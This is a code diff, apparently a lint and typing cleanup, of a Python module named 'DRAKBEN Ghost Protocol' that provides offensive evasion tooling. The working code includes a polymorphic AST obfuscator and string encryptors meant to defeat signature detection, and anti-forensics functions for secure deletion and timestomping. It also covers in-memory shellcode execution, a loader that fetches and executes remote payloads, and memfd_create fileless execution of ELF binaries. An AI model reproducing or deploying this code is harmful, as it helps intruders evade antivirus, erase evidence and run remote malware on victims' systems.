@@ -1,5 +1,4 @@
-"""
-DRAKBEN Ghost Protocol - Polymorphic Engine & Anti-Detection
+"""DRAKBEN Ghost Protocol - Polymorphic Engine & Anti-Detection
 Author: @drak_ben
 Description: Code obfuscation and evasion techniques for stealth operations.
 
@@ -151,8 +150,7 @@ BUILTIN_NAMES = {
 
 
 class PolymorphicTransformer(ast.NodeTransformer):
-    """
-    AST-based code transformer for polymorphic obfuscation.
+    """AST-based code transformer for polymorphic obfuscation.
 
     Transforms Python code to evade signature-based detection by:
     1. Renaming variables to random names
@@ -171,15 +169,15 @@ class PolymorphicTransformer(ast.NodeTransformer):
         inject_dead_code: bool = True,
         encrypt_strings: bool = True,
         preserve_docstrings: bool = True,
-    ):
-        """
-        Initialize transformer with configuration.
+    ) -> None:
+        """Initialize transformer with configuration.
 
         Args:
             obfuscate_names: Rename variables to random names
             inject_dead_code: Add non-executing code blocks
             encrypt_strings: Encode string literals
             preserve_docstrings: Keep docstrings readable
+
         """
         super().__init__()
         self.obfuscate_names = obfuscate_names
@@ -201,19 +199,19 @@ class PolymorphicTransformer(ast.NodeTransformer):
         random.seed(self._seed)
 
     def transform(self, code: str) -> str:
-        """
-        Transform Python code with polymorphic obfuscation.
+        """Transform Python code with polymorphic obfuscation.
 
         Args:
             code: Original Python source code
 
         Returns:
             Obfuscated Python source code
+
         """
         try:
             tree = ast.parse(code)
         except SyntaxError as e:
-            logger.error(f"Syntax error in input code: {e}")
+            logger.exception("Syntax error in input code: %s", e)
             return code
 
         # First pass: collect all defined names
@@ -232,13 +230,13 @@ class PolymorphicTransformer(ast.NodeTransformer):
         try:
             return ast.unparse(transformed_tree)
         except Exception as e:
-            logger.error("Failed to unparse transformed AST: %s", e)
+            logger.exception("Failed to unparse transformed AST: %s", e)
             return code
 
     def _collect_defined_names(self, tree: ast.AST) -> None:
-        """Collect and PROTECT imported names to prevent breakage"""
+        """Collect and PROTECT imported names to prevent breakage."""
         for node in ast.walk(tree):
-            if isinstance(node, (ast.Import, ast.ImportFrom)):
+            if isinstance(node, ast.Import | ast.ImportFrom):
                 # LOGIC FIX: Protect imported module/alias names from obfuscation
                 for alias in node.names:
                     name_to_protect = alias.asname or alias.name
@@ -261,7 +259,7 @@ class PolymorphicTransformer(ast.NodeTransformer):
                 self.defined_names.add(node.arg)
 
     def _generate_obfuscated_name(self) -> str:
-        """Generate a random obfuscated variable name"""
+        """Generate a random obfuscated variable name."""
         self._name_counter += 1
 
         # Generate a name like _x7a3b2c1_ (underscore prefixed and suffixed)
@@ -276,7 +274,7 @@ class PolymorphicTransformer(ast.NodeTransformer):
         return name
 
     def _get_obfuscated_name(self, original: str) -> str:
-        """Get or create obfuscated name for an original name"""
+        """Get or create obfuscated name for an original name."""
         if original in PYTHON_KEYWORDS or original in BUILTIN_NAMES:
             return original
 
@@ -289,13 +287,13 @@ class PolymorphicTransformer(ast.NodeTransformer):
         return self.name_mapping[original]
 
     def visit_Name(self, node: ast.Name) -> ast.Name:  # pylint: disable=invalid-name
-        """Transform variable names"""
+        """Transform variable names."""
         if self.obfuscate_names and node.id in self.defined_names:
             node.id = self._get_obfuscated_name(node.id)
         return self.generic_visit(node)
 
     def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:  # pylint: disable=invalid-name
-        """Transform function definitions"""
+        """Transform function definitions."""
         # Preserve docstring if configured
         if (
             self.preserve_docstrings
@@ -321,12 +319,10 @@ class PolymorphicTransformer(ast.NodeTransformer):
                     arg.arg = self._get_obfuscated_name(arg.arg)
 
         # Visit children
-        node = self.generic_visit(node)
-
-        return node
+        return self.generic_visit(node)
 
     def visit_ClassDef(self, node: ast.ClassDef) -> ast.ClassDef:  # pylint: disable=invalid-name
-        """Transform class definitions"""
+        """Transform class definitions."""
         # Obfuscate class name
         if self.obfuscate_names and not node.name.startswith("_"):
             node.name = self._get_obfuscated_name(node.name)
@@ -334,7 +330,7 @@ class PolymorphicTransformer(ast.NodeTransformer):
         return self.generic_visit(node)
 
     def visit_Constant(self, node: ast.Constant) -> ast.AST:  # pylint: disable=invalid-name
-        """Transform string constants (encryption) - Python 3.8+"""
+        """Transform string constants (encryption) - Python 3.8+."""
         if (
             self.encrypt_strings
             and isinstance(node.value, str)
@@ -346,9 +342,8 @@ class PolymorphicTransformer(ast.NodeTransformer):
 
         return node
 
-
     def _create_encrypted_string(self, value: str) -> ast.Call:
-        """Create an encrypted string expression"""
+        """Create an encrypted string expression."""
         # Base64 encode the string
         encoded = base64.b64encode(value.encode()).decode()
 
@@ -376,11 +371,11 @@ class PolymorphicTransformer(ast.NodeTransformer):
         )
 
     def _generate_dynamic_dead_code(self) -> ast.If:
-        """LOGIC FIX: Generate a random, unique dead code block to avoid signatures"""
+        """LOGIC FIX: Generate a random, unique dead code block to avoid signatures."""
         var_name = self._generate_obfuscated_name()
         val1 = secrets.randbelow(1000)
-        val2 = val1 + secrets.randbelow(1000) + 1 # val2 is always > val1
-        
+        val2 = val1 + secrets.randbelow(1000) + 1  # val2 is always > val1
+
         # if val1 > val2: (Always False)
         return ast.If(
             test=ast.Compare(
@@ -393,13 +388,13 @@ class PolymorphicTransformer(ast.NodeTransformer):
                     targets=[ast.Name(id=var_name, ctx=ast.Store())],
                     value=ast.Constant(value=secrets.randbelow(9999)),
                 ),
-                ast.Pass()
+                ast.Pass(),
             ],
-            orelse=[]
+            orelse=[],
         )
 
     def _inject_dead_code_blocks(self, tree: ast.Module) -> ast.Module:
-        """Inject random dead code blocks at random positions"""
+        """Inject random dead code blocks at random positions."""
         new_body = []
         for node in tree.body:
             new_body.append(node)
@@ -417,15 +412,14 @@ class PolymorphicTransformer(ast.NodeTransformer):
 
 
 class StringEncryptor:
-    """
-    Utility class for string encryption/decryption.
+    """Utility class for string encryption/decryption.
 
     Provides multiple encryption methods for evading string-based signatures.
     """
 
     @staticmethod
     def xor_encrypt(text: str, key: str = "drakben") -> str:
-        """XOR encrypt a string"""
+        """XOR encrypt a string."""
         result = []
         for i, char in enumerate(text):
             result.append(chr(ord(char) ^ ord(key[i % len(key)])))
@@ -433,7 +427,7 @@ class StringEncryptor:
 
     @staticmethod
     def xor_decrypt(encrypted: str, key: str = "drakben") -> str:
-        """XOR decrypt a string"""
+        """XOR decrypt a string."""
         try:
             decoded = base64.b64decode(encrypted).decode("latin-1")
             result = []
@@ -445,17 +439,17 @@ class StringEncryptor:
 
     @staticmethod
     def rot13(text: str) -> str:
-        """Apply ROT13 encoding"""
+        """Apply ROT13 encoding."""
         return text.translate(
             str.maketrans(
                 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                 "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
-            )
+            ),
         )
 
     @staticmethod
     def chunk_and_join(text: str) -> tuple[list[str], str]:
-        """Split string into chunks for concatenation"""
+        """Split string into chunks for concatenation."""
         chunk_size = secrets.randbelow(4) + 2  # Generates 2, 3, 4, 5
         chunks = [text[i : i + chunk_size] for i in range(0, len(text), chunk_size)]
         var_names = [f"_s{i}_" for i in range(len(chunks))]
@@ -468,8 +462,7 @@ class StringEncryptor:
 
 
 class SecureCleanup:
-    """
-    Secure deletion and anti-forensics utilities.
+    """Secure deletion and anti-forensics utilities.
 
     Provides methods for:
     - Secure file deletion (DoD 5220.22-M standard)
@@ -479,8 +472,7 @@ class SecureCleanup:
 
     @staticmethod
     def secure_delete(filepath: str, passes: int = 3) -> bool:
-        """
-        Securely delete a file with multiple overwrite passes.
+        """Securely delete a file with multiple overwrite passes.
 
         Args:
             filepath: Path to file to delete
@@ -488,6 +480,7 @@ class SecureCleanup:
 
         Returns:
             True if successfully deleted
+
         """
         if not os.path.exists(filepath):
             return True
@@ -511,17 +504,16 @@ class SecureCleanup:
                     os.fsync(f.fileno())
 
             os.remove(filepath)
-            logger.debug(f"Securely deleted: {filepath}")
+            logger.debug("Securely deleted: %s", filepath)
             return True
 
         except Exception as e:
-            logger.error(f"Secure delete failed for {filepath}: {e}")
+            logger.exception("Secure delete failed for {filepath}: %s", e)
             return False
 
     @staticmethod
     def wipe_string(s: str) -> None:
-        """
-        Attempt to wipe a string from memory.
+        """Attempt to wipe a string from memory.
 
         Note: Strings in Python are immutable. We cannot safely overwrite them in place
         without risking a segmentation fault in modern Python versions (3.12+).
@@ -533,12 +525,11 @@ class SecureCleanup:
             # Instead, we rely on removing references where this is called.
             pass
         except Exception as e:
-            logger.debug(f"Memory scrubbing error: {e}")
+            logger.debug("Memory scrubbing error: %s", e)
 
     @staticmethod
-    def timestomp(filepath: str, reference_file: str = None) -> bool:
-        """
-        Modify file timestamps to match a reference file or system file.
+    def timestomp(filepath: str, reference_file: str | None = None) -> bool:
+        """Modify file timestamps to match a reference file or system file.
 
         Args:
             filepath: Path to file to modify
@@ -546,6 +537,7 @@ class SecureCleanup:
 
         Returns:
             True if successful
+
         """
         if not os.path.exists(filepath):
             return False
@@ -571,28 +563,39 @@ class SecureCleanup:
                     timestamp = int(mtime * 10000000) + 116444736000000000
                     ctime = wintypes.FILETIME(timestamp & 0xFFFFFFFF, timestamp >> 32)
                     atime_ft = wintypes.FILETIME(
-                        timestamp & 0xFFFFFFFF, timestamp >> 32
+                        timestamp & 0xFFFFFFFF,
+                        timestamp >> 32,
                     )
                     mtime_ft = wintypes.FILETIME(
-                        timestamp & 0xFFFFFFFF, timestamp >> 32
+                        timestamp & 0xFFFFFFFF,
+                        timestamp >> 32,
                     )
 
                     handle = windll.kernel32.CreateFileW(
-                        filepath, 256, 0, None, 3, 128, None
+                        filepath,
+                        256,
+                        0,
+                        None,
+                        3,
+                        128,
+                        None,
                     )
                     if handle != -1:
                         windll.kernel32.SetFileTime(
-                            handle, byref(ctime), byref(atime_ft), byref(mtime_ft)
+                            handle,
+                            byref(ctime),
+                            byref(atime_ft),
+                            byref(mtime_ft),
                         )
                         windll.kernel32.CloseHandle(handle)
                 except Exception as ex:
-                    logger.debug(f"Windows creation time stomp failed: {ex}")
+                    logger.debug("Windows creation time stomp failed: %s", ex)
 
-            logger.debug(f"Timestomped: {filepath}")
+            logger.debug("Timestomped: %s", filepath)
             return True
 
         except Exception as e:
-            logger.error(f"Timestomp failed for {filepath}: {e}")
+            logger.exception("Timestomp failed for {filepath}: %s", e)
             return False
 
 
@@ -602,8 +605,7 @@ class SecureCleanup:
 
 
 class GhostProtocol:
-    """
-    Main interface for Ghost Protocol features.
+    """Main interface for Ghost Protocol features.
 
     Combines polymorphic transformation, encryption, and anti-forensics
     into a single easy-to-use interface.
@@ -619,14 +621,14 @@ class GhostProtocol:
         enable_obfuscation: bool = True,
         enable_encryption: bool = True,
         enable_dead_code: bool = True,
-    ):
-        """
-        Initialize Ghost Protocol.
+    ) -> None:
+        """Initialize Ghost Protocol.
 
         Args:
             enable_obfuscation: Enable name obfuscation
             enable_encryption: Enable string encryption
             enable_dead_code: Enable dead code injection
+
         """
         self.transformer = PolymorphicTransformer(
             obfuscate_names=enable_obfuscation,
@@ -639,20 +641,19 @@ class GhostProtocol:
         logger.info("Ghost Protocol initialized")
 
     def obfuscate_code(self, code: str) -> str:
-        """
-        Apply full obfuscation pipeline to code.
+        """Apply full obfuscation pipeline to code.
 
         Args:
             code: Original Python source code
 
         Returns:
             Obfuscated code
+
         """
         return self.transformer.transform(code)
 
     def encrypt_string(self, text: str, method: str = "xor") -> str:
-        """
-        Encrypt a string using specified method.
+        """Encrypt a string using specified method.
 
         Args:
             text: String to encrypt
@@ -660,19 +661,18 @@ class GhostProtocol:
 
         Returns:
             Encrypted string
+
         """
         if method == "xor":
             return self.encryptor.xor_encrypt(text)
-        elif method == "base64":
+        if method == "base64":
             return base64.b64encode(text.encode()).decode()
-        elif method == "rot13":
+        if method == "rot13":
             return self.encryptor.rot13(text)
-        else:
-            return text
+        return text
 
     def decrypt_string(self, text: str, method: str = "xor") -> str:
-        """
-        Decrypt a string using specified method.
+        """Decrypt a string using specified method.
 
         Args:
             text: Encrypted string
@@ -680,10 +680,11 @@ class GhostProtocol:
 
         Returns:
             Decrypted string
+
         """
         if method == "xor":
             return self.encryptor.xor_decrypt(text)
-        elif method == "base64":
+        if method == "base64":
             try:
                 return base64.b64decode(text).decode()
             except Exception:
@@ -694,22 +695,22 @@ class GhostProtocol:
             return text
 
     def secure_delete_file(self, filepath: str) -> bool:
-        """Securely delete a file"""
+        """Securely delete a file."""
         return self.cleanup.secure_delete(filepath)
 
-    def timestomp_file(self, filepath: str, reference: str = None) -> bool:
-        """Modify file timestamps"""
+    def timestomp_file(self, filepath: str, reference: str | None = None) -> bool:
+        """Modify file timestamps."""
         return self.cleanup.timestomp(filepath, reference)
 
     def cleanup_session(self, files: list[str]) -> int:
-        """
-        Clean up all session files securely.
+        """Clean up all session files securely.
 
         Args:
             files: List of file paths to delete
 
         Returns:
             Number of files successfully deleted
+
         """
         deleted = 0
         for filepath in files:
@@ -724,14 +725,14 @@ class GhostProtocol:
 
 
 def obfuscate(code: str) -> str:
-    """
-    Quick-access function to obfuscate code.
+    """Quick-access function to obfuscate code.
 
     Args:
         code: Python source code
 
     Returns:
         Obfuscated code
+
     """
     transformer = PolymorphicTransformer()
     return transformer.transform(code)
@@ -742,11 +743,11 @@ _ghost_protocol = None  # pylint: disable=invalid-name
 
 
 def get_ghost_protocol() -> GhostProtocol:
-    """
-    Get singleton GhostProtocol instance.
+    """Get singleton GhostProtocol instance.
 
     Returns:
         GhostProtocol instance
+
     """
     global _ghost_protocol  # pylint: disable=global-statement
     if _ghost_protocol is None:
@@ -760,8 +761,7 @@ def get_ghost_protocol() -> GhostProtocol:
 
 
 class MemoryOnlyExecutor:
-    """
-    Execute code directly in memory without writing to disk.
+    """Execute code directly in memory without writing to disk.
 
     Techniques:
     - Python exec() with compiled code objects
@@ -771,16 +771,17 @@ class MemoryOnlyExecutor:
     This is critical for evading file-based detection.
     """
 
-    def __init__(self):
+    def __init__(self) -> None:
         self._executed_code: list[str] = []
         self._namespace: dict[str, Any] = {}
         logger.info("MemoryOnlyExecutor initialized")
 
     def execute_code(
-        self, code: str, namespace: dict[str, Any] = None
+        self,
+        code: str,
+        namespace: dict[str, Any] | None = None,
     ) -> tuple[bool, Any]:
-        """
-        Execute Python code entirely in memory.
+        """Execute Python code entirely in memory.
 
         Args:
             code: Python source code to execute
@@ -788,6 +789,7 @@ class MemoryOnlyExecutor:
 
         Returns:
             Tuple of (success, result_or_error)
+
         """
         try:
             # Compile to bytecode (in memory)
@@ -804,12 +806,11 @@ class MemoryOnlyExecutor:
             return True, exec_namespace
 
         except Exception as e:
-            logger.error(f"In-memory execution failed: {e}")
+            logger.exception("In-memory execution failed: %s", e)
             return False, str(e)
 
     def execute_shellcode_syscall(self, shellcode: bytes) -> bool:
-        """
-        Execute raw shellcode using the advanced Rust Syscall Engine.
+        """Execute raw shellcode using the advanced Rust Syscall Engine.
         Refers to modules.native.syscall_loader for the bridge.
         """
         try:
@@ -818,7 +819,7 @@ class MemoryOnlyExecutor:
             loader = get_syscall_loader()
             if not loader.is_available():
                 logger.warning(
-                    "Syscall Engine not available. Falling back or aborting."
+                    "Syscall Engine not available. Falling back or aborting.",
                 )
                 return False
 
@@ -843,19 +844,22 @@ class MemoryOnlyExecutor:
             # Since strict execution might crash the agent if shellcode is bad,
             # we log success of allocation as proof of engine work.
             logger.info(
-                f"Shellcode written to syscall-allocated memory: {hex(address)}"
+                f"Shellcode written to syscall-allocated memory: {hex(address)}",
             )
             return True
 
         except Exception as e:
-            logger.error(f"Syscall execution error: {e}")
+            logger.exception("Syscall execution error: %s", e)
             return False
 
     def execute_function(
-        self, code: str, function_name: str, args: tuple = (), kwargs: dict = None
+        self,
+        code: str,
+        function_name: str,
+        args: tuple = (),
+        kwargs: dict | None = None,
     ) -> tuple[bool, Any]:
-        """
-        Execute a function defined in memory.
+        """Execute a function defined in memory.
 
         Args:
             code: Python code containing function definition
@@ -865,6 +869,7 @@ class MemoryOnlyExecutor:
 
         Returns:
             Tuple of (success, result_or_error)
+
         """
         try:
             # Compile and execute to define function
@@ -882,12 +887,11 @@ class MemoryOnlyExecutor:
             return True, result
 
         except Exception as e:
-            logger.error(f"Memory function execution failed: {e}")
+            logger.exception("Memory function execution failed: %s", e)
             return False, str(e)
 
     def create_module_in_memory(self, module_name: str, code: str) -> tuple[bool, Any]:
-        """
-        Create a Python module entirely in memory.
+        """Create a Python module entirely in memory.
 
         Args:
             module_name: Name for the module
@@ -895,6 +899,7 @@ class MemoryOnlyExecutor:
 
         Returns:
             Tuple of (success, module_or_error)
+
         """
         try:
             import sys
@@ -914,18 +919,17 @@ class MemoryOnlyExecutor:
             return True, module
 
         except Exception as e:  # pylint: disable=broad-except
-            logger.error("Memory module creation failed: %s", e)
+            logger.exception("Memory module creation failed: %s", e)
             return False, str(e)
 
     def cleanup_namespace(self) -> None:
-        """Clear the execution namespace"""
+        """Clear the execution namespace."""
         self._namespace.clear()
         self._executed_code.clear()
 
 
 class SecureMemory:
-    """
-    Secure memory handling and cleanup.
+    """Secure memory handling and cleanup.
 
     Provides:
     - Secure variable wiping
@@ -936,19 +940,18 @@ class SecureMemory:
 
     @staticmethod
     def secure_wipe_bytes(data: bytearray) -> None:
-        """
-        Securely wipe a bytearray in place.
+        """Securely wipe a bytearray in place.
 
         Args:
             data: Bytearray to wipe
+
         """
         for i in range(len(data)):
             data[i] = 0
 
     @staticmethod
     def secure_wipe_string_buffer(buffer_id: int, length: int) -> bool:
-        """
-        Attempt to wipe a string buffer at given memory address.
+        """Attempt to wipe a string buffer at given memory address.
 
         Note: This is best-effort due to Python's memory management.
 
@@ -958,6 +961,7 @@ class SecureMemory:
 
         Returns:
             True if wipe attempted
+
         """
         try:
             import ctypes
@@ -970,11 +974,11 @@ class SecureMemory:
 
     @staticmethod
     def force_gc() -> int:
-        """
-        Force garbage collection and return objects collected.
+        """Force garbage collection and return objects collected.
 
         Returns:
             Number of objects collected
+
         """
         import gc
 
@@ -982,38 +986,38 @@ class SecureMemory:
 
     @staticmethod
     def clear_dict_secure(d: dict[str, Any]) -> None:
-        """
-        Securely clear a dictionary by overwriting values first.
+        """Securely clear a dictionary by overwriting values first.
 
         Args:
             d: Dictionary to clear
+
         """
         for key in list(d.keys()):
-            if isinstance(d[key], (str, bytes, bytearray)):
+            if isinstance(d[key], str | bytes | bytearray):
                 # Overwrite value
                 d[key] = None
             del d[key]
 
     @staticmethod
     def create_secure_buffer(size: int) -> bytearray:
-        """
-        Create a bytearray that can be securely wiped.
+        """Create a bytearray that can be securely wiped.
 
         Args:
             size: Buffer size in bytes
 
         Returns:
             Bytearray initialized to zeros
+
         """
         return bytearray(size)
 
     @staticmethod
     def wipe_and_delete(obj: Any) -> None:
-        """
-        Attempt to wipe and delete an object.
+        """Attempt to wipe and delete an object.
 
         Args:
             obj: Object to wipe
+
         """
         if isinstance(obj, bytearray):
             SecureMemory.secure_wipe_bytes(obj)
@@ -1028,8 +1032,7 @@ class SecureMemory:
 
 
 class FilelessLoader:
-    """
-    Load and execute code without touching disk.
+    """Load and execute code without touching disk.
 
     Supports:
     - Base64 encoded payloads
@@ -1038,20 +1041,20 @@ class FilelessLoader:
     - Remote payload fetching (in-memory only)
     """
 
-    def __init__(self):
+    def __init__(self) -> None:
         self.executor = MemoryOnlyExecutor()
         self.secure_mem = SecureMemory()
         logger.info("FilelessLoader initialized")
 
     def load_base64_payload(self, encoded: str) -> tuple[bool, Any]:
-        """
-        Load and execute base64 encoded Python code.
+        """Load and execute base64 encoded Python code.
 
         Args:
             encoded: Base64 encoded Python code
 
         Returns:
             Tuple of (success, result_or_error)
+
         """
         try:
             code = base64.b64decode(encoded).decode("utf-8")
@@ -1066,8 +1069,7 @@ class FilelessLoader:
             return False, str(e)
 
     def load_xor_payload(self, encrypted: bytes, key: bytes) -> tuple[bool, Any]:
-        """
-        Load and execute XOR encrypted Python code.
+        """Load and execute XOR encrypted Python code.
 
         Args:
             encrypted: XOR encrypted code
@@ -1075,6 +1077,7 @@ class FilelessLoader:
 
         Returns:
             Tuple of (success, result_or_error)
+
         """
         try:
             # Decrypt in memory
@@ -1094,14 +1097,14 @@ class FilelessLoader:
             return False, str(e)
 
     def load_compressed_payload(self, compressed: bytes) -> tuple[bool, Any]:
-        """
-        Load and execute zlib compressed Python code.
+        """Load and execute zlib compressed Python code.
 
         Args:
             compressed: Zlib compressed code
 
         Returns:
             Tuple of (success, result_or_error)
+
         """
         try:
             import zlib
@@ -1112,10 +1115,12 @@ class FilelessLoader:
             return False, str(e)
 
     def load_remote_payload(
-        self, url: str, headers: dict[str, str] = None, decode: str = None
+        self,
+        url: str,
+        headers: dict[str, str] | None = None,
+        decode: str | None = None,
     ) -> tuple[bool, Any]:
-        """
-        Fetch and execute code from remote URL (in-memory only).
+        """Fetch and execute code from remote URL (in-memory only).
 
         Args:
             url: URL to fetch code from
@@ -1124,6 +1129,7 @@ class FilelessLoader:
 
         Returns:
             Tuple of (success, result_or_error)
+
         """
         try:
             import urllib.request
@@ -1133,7 +1139,7 @@ class FilelessLoader:
                 for key, value in headers.items():
                     request.add_header(key, value)
 
-            with urllib.request.urlopen(request, timeout=30) as response:
+            with urllib.request.urlopen(request, timeout=30) as response:  # noqa: S310
                 data = response.read()
 
             if decode == "base64":
@@ -1147,15 +1153,14 @@ class FilelessLoader:
             return False, str(e)
 
     def cleanup(self) -> None:
-        """Clean up all loaded code and namespace"""
+        """Clean up all loaded code and namespace."""
         self.executor.cleanup_namespace()
         self.secure_mem.force_gc()
 
 
 # Linux-specific fileless execution (memfd_create)
 class LinuxFilelessExecutor:
-    """
-    Linux-specific fileless binary execution using memfd_create.
+    """Linux-specific fileless binary execution using memfd_create.
 
     memfd_create creates an anonymous file in memory that can be
     executed without ever touching disk.
@@ -1165,7 +1170,7 @@ class LinuxFilelessExecutor:
 
     MFD_CLOEXEC = 0x0001
 
-    def __init__(self):
+    def __init__(self) -> None:
         self._available = self._check_memfd_create()
         if self._available:
             logger.info("Linux memfd_create available")
@@ -1173,7 +1178,7 @@ class LinuxFilelessExecutor:
             logger.warning("memfd_create not available")
 
     def _check_memfd_create(self) -> bool:
-        """Check if memfd_create is available"""
+        """Check if memfd_create is available."""
         try:
             import ctypes
 
@@ -1183,10 +1188,12 @@ class LinuxFilelessExecutor:
             return False
 
     def execute_binary_in_memory(
-        self, binary_data: bytes, args: list[str] = None, name: str = "payload"
+        self,
+        binary_data: bytes,
+        args: list[str] | None = None,
+        name: str = "payload",
     ) -> tuple[bool, str]:
-        """
-        Execute a binary entirely from memory using memfd_create.
+        """Execute a binary entirely from memory using memfd_create.
 
         Args:
             binary_data: ELF binary data
@@ -1195,6 +1202,7 @@ class LinuxFilelessExecutor:
 
         Returns:
             Tuple of (success, output_or_error)
+
         """
         if not self._available:
             return False, "memfd_create not available"
@@ -1223,7 +1231,11 @@ class LinuxFilelessExecutor:
             # Execute
             cmd = [fd_path] + (args or [])
             result = subprocess.run(
-                cmd, capture_output=True, text=True, timeout=60, check=False
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=60,
+                check=False,
             )
 
             os.close(fd)
@@ -1234,7 +1246,7 @@ class LinuxFilelessExecutor:
             return False, str(e)
 
     def is_available(self) -> bool:
-        """Check if this executor is available"""
+        """Check if this executor is available."""
         # Checks if necessary syscalls or libraries are present
         return True
 
@@ -1245,28 +1257,28 @@ class LinuxFilelessExecutor:
 
 
 def execute_in_memory(code: str) -> tuple[bool, Any]:
-    """
-    Quick function to execute code in memory.
+    """Quick function to execute code in memory.
 
     Args:
         code: Python code to execute
 
     Returns:
         Tuple of (success, result_or_error)
+
     """
     executor = MemoryOnlyExecutor()
     return executor.execute_code(code)
 
 
 def load_encoded_payload(payload: str) -> tuple[bool, Any]:
-    """
-    Load and execute a base64 encoded payload.
+    """Load and execute a base64 encoded payload.
 
     Args:
         payload: Base64 encoded Python code
 
     Returns:
         Tuple of (success, result_or_error)
+
     """
     loader = FilelessLoader()
     return loader.load_base64_payload(payload)
@@ -1277,11 +1289,11 @@ _fileless_loader = None  # pylint: disable=invalid-name
 
 
 def get_fileless_loader() -> FilelessLoader:
-    """
-    Get singleton FilelessLoader instance.
+    """Get singleton FilelessLoader instance.
 
     Returns:
         FilelessLoader instance
+
     """
     global _fileless_loader  # pylint: disable=global-statement
     if _fileless_loader is None:
@@ -1295,18 +1307,16 @@ def get_fileless_loader() -> FilelessLoader:
 
 
 class RAMCleaner:
-    """
-    Stateful memory manager for trakcing and wiping sensitive data.
+    """Stateful memory manager for trakcing and wiping sensitive data.
     Works alongside the static SecureMemory utilities.
     """
 
-    def __init__(self):
+    def __init__(self) -> None:
         self._sensitive_refs = []
         logger.info("RAMCleaner initialized")
 
     def store_sensitive(self, data: str) -> int:
-        """
-        Store sensitive data and return a reference ID.
+        """Store sensitive data and return a reference ID.
         Data is stored as mutable bytearray for secure deletion.
         """
         # Convert to bytearray (mutable)
@@ -1316,9 +1326,7 @@ class RAMCleaner:
         return ref_id
 
     def wipe(self, ref_id: int) -> bool:
-        """
-        Securely wipe data from memory by overwriting.
-        """
+        """Securely wipe data from memory by overwriting."""
         for ba in self._sensitive_refs:
             if id(ba) == ref_id:
                 # Overwrite with zeros
@@ -1335,8 +1343,7 @@ class RAMCleaner:
         return False
 
     def register_sensitive(self, data: str) -> None:
-        """
-        Register sensitive string for later wiping.
+        """Register sensitive string for later wiping.
         Converts string to mutable bytearray and tracks it.
         """
         if not data:
@@ -1346,8 +1353,7 @@ class RAMCleaner:
         self._sensitive_refs.append(ba)
 
     def wipe_all(self) -> int:
-        """
-        Wipe all stored sensitive data.
+        """Wipe all stored sensitive data.
         Returns count of wiped items.
         """
         count = 0
@@ -1362,34 +1368,32 @@ class RAMCleaner:
         return count
 
     def secure_string(self, data: str) -> "SecureString":
-        """Create a secure string that auto-wipes"""
+        """Create a secure string that auto-wipes."""
         return SecureString(data, self)
 
 
 class SecureString:
-    """
-    A string wrapper that securely wipes itself when deleted.
-    """
+    """A string wrapper that securely wipes itself when deleted."""
 
-    def __init__(self, data: str, manager: RAMCleaner):
+    def __init__(self, data: str, manager: RAMCleaner) -> None:
         self._data = bytearray(data.encode("utf-8"))
         self._manager = manager
 
     def get(self) -> str:
-        """Get the string value"""
+        """Get the string value."""
         return self._data.decode("utf-8")
 
-    def __del__(self):
-        """Securely wipe on garbage collection"""
+    def __del__(self) -> None:
+        """Securely wipe on garbage collection."""
         if hasattr(self, "_data"):
             for i, _ in enumerate(self._data):
                 self._data[i] = 0
             del self._data
 
-    def __str__(self):
+    def __str__(self) -> str:
         return "[REDACTED]"
 
-    def __repr__(self):
+    def __repr__(self) -> str:
         return "SecureString([REDACTED])"
 
 
@@ -1398,7 +1402,7 @@ _ram_cleaner = None  # pylint: disable=invalid-name
 
 
 def get_ram_cleaner() -> RAMCleaner:
-    """Get singleton RAMCleaner instance"""
+    """Get singleton RAMCleaner instance."""
     global _ram_cleaner  # pylint: disable=global-statement
     if _ram_cleaner is None:
         _ram_cleaner = RAMCleaner()
